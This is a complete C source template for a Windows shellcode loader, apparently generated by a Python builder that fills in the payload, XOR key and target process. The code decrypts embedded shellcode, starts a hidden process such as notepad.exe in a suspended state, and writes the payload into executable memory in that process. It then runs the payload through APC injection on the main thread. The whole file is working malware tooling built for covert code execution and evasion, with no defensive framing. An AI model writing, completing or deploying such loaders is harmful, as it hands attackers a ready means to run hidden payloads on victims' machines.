#include <windows.h>
#include <stdio.h> // For debugging printf, can be removed for release
#include <tlhelp32.h> // Not strictly needed for this basic APC injection but often included

// Simple XOR decryption stub
void XOR(char *data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

int main(void) {
    // Shellcode, key, and target process path are injected by the Python script
    unsigned char shellcode[] = { {{ shellcode_hex }} };
    char key = {{ xor_key }};
    wchar_t targetProcessPath[] = L"{{ target_process_str }}"; // e.g., L"C:\\Windows\\System32\\notepad.exe"

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; // Specify si.wShowWindow is used
    si.wShowWindow = SW_HIDE;         // Hide the window of the spawned process

    ZeroMemory(&pi, sizeof(pi));

    // Decrypt the payload
    XOR((char *)shellcode, sizeof(shellcode), key);

    // Create the target process in a suspended state
    // CREATE_NO_WINDOW can also be used in dwCreationFlags for console apps
    // or if STARTF_USESHOWWINDOW and SW_HIDE is not enough.
    if (!CreateProcessW(
            NULL,                   // No module name (use command line)
            targetProcessPath,      // Command line (path to executable)
            NULL,                   // Process handle not inheritable
            NULL,                   // Thread handle not inheritable
            FALSE,                  // Set handle inheritance to FALSE
            CREATE_SUSPENDED | CREATE_NO_WINDOW, // Creation flags: create suspended and no window
            NULL,                   // Use parent's environment block
            NULL,                   // Use parent's starting directory 
            &si,                    // Pointer to STARTUPINFO structure
            &pi                     // Pointer to PROCESS_INFORMATION structure
        )) {
        // Optional: Add GetLastError() for debugging if needed
        // printf("CreateProcessW failed (%lu).\\n", GetLastError());
        return 1;
    }

    // Allocate memory in the remote process for the shellcode
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMem == NULL) {
        // printf("VirtualAllocEx failed (%lu).\\n", GetLastError());
        TerminateProcess(pi.hProcess, 1); // Terminate the suspended process
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // Write the shellcode into the allocated memory of the remote process
    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, sizeof(shellcode), NULL)) {
        // printf("WriteProcessMemory failed (%lu).\\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE); // Free the allocated memory
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // Queue an APC to the main thread of the suspended process.
    // The APC will execute our shellcode (pointed to by remoteMem).
    // (PAPCFUNC)remoteMem casts the shellcode's address to a function pointer type expected by QueueUserAPC.
    if (QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, (ULONG_PTR)NULL) == 0) { // Second param is thread handle, third is data for APC func
        // printf("QueueUserAPC failed (%lu).\\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // Resume the main thread of the suspended process.
    // When the thread becomes alertable, it will execute the queued APC (our shellcode).
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        // printf("ResumeThread failed (%lu).\\n", GetLastError());
        // APC might not have been cleaned up, but process termination will handle it.
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0; // Success
}